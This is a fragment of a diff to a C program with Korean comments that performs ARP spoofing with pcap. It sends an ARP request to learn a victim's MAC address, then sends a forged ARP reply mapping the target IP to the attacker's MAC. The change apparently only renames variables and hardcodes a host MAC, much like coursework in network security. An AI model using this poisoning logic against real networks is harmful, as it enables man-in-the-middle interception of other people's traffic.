@@ -46,8 +46,8 @@ int main(int argc, char* argv[])
         else { /* handle error */ }
     }
 
-    uint8_t attacker_mac_address[6];
-    if (success) memcpy(attacker_mac_address, ifr.ifr_hwaddr.sa_data, 6);
+    uint8_t attacker_mac[6];
+    if (success) memcpy(attacker_mac, ifr.ifr_hwaddr.sa_data, 6);
 // getting mac address 끝
 
 // 여기서부터 작성한 코드
@@ -76,15 +76,17 @@ int main(int argc, char* argv[])
 
         // arp request 전송
     
-    attacker_mac_address[0] = 0x38;
-    attacker_mac_address[1] = 0xf9;
-    attacker_mac_address[2] = 0xd3;
-    attacker_mac_address[3] = 0x73;
-    attacker_mac_address[4] = 0xa4;
-    attacker_mac_address[5] = 0x24;
+    // in host
+    uint8_t attacker_mac_host[6];
+    attacker_mac_host[0] = 0x38;
+    attacker_mac_host[1] = 0xf9;
+    attacker_mac_host[2] = 0xd3;
+    attacker_mac_host[3] = 0x73;
+    attacker_mac_host[4] = 0xa4;
+    attacker_mac_host[5] = 0x24;
 
     arp_packet arp_packet_get_sender_mac_packet;
-    arp_packet_get_sender_mac_packet = arp_request_get_sender_mac_addr(attacker_mac_address, sender_ip);
+    arp_packet_get_sender_mac_packet = arp_request_get_sender_mac_addr(attacker_mac_host, sender_ip);
     
 
     if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_get_sender_mac_packet), ARP_PACKET_LEN) != 0){
@@ -111,7 +113,7 @@ int main(int argc, char* argv[])
                 int end = start + MAC_address_length;
                 bool continue_detect = false;
                 for(int i = start; i < end; i++){
-                    if(*(packet + i) != attacker_mac_address[i - start]){
+                    if(*(packet + i) != attacker_mac_host[i - start]){
                         continue_detect = true;
                         break;
                     }
@@ -126,7 +128,7 @@ int main(int argc, char* argv[])
 
     // 두 번째로 할 일 - sender 에게 [ip = target ip / mac = attacker mac] 인 arp response 전송
     arp_packet arp_packet_deceive_sender;
-    arp_packet_deceive_sender = arp_reply_target_ip_with_attacker_mac(attacker_mac_address, sender_mac, target_ip, sender_ip);
+    arp_packet_deceive_sender = arp_reply_target_ip_with_attacker_mac(attacker_mac_host, sender_mac, target_ip, sender_ip);
 
     if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_deceive_sender), ARP_PACKET_LEN) != 0){
         printf("[Error] packet sending is failed.\n");
